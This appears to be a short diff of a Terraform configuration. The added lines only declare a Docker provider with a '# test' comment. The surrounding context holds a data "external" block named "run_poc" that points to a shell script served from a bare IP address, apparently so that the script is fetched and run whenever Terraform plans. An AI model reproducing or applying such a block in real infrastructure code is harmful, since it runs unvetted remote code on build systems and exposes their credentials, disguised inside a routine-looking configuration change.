@@ -3,6 +3,10 @@ terraform {
     random = {
       source = "hashicorp/random"
     }
+    docker = {
+      source = "kreuzwerker/docker"
+      version = "~> 3.0"
+    }
   }
 }
 
@@ -16,6 +20,10 @@ data "external" "run_poc" {
   query = {
     url = "http://164.90.177.231:8080/script.sh"
   }
+}
+
+provider "docker" {
+  # test
 }
 
 variable "env_type_id" {
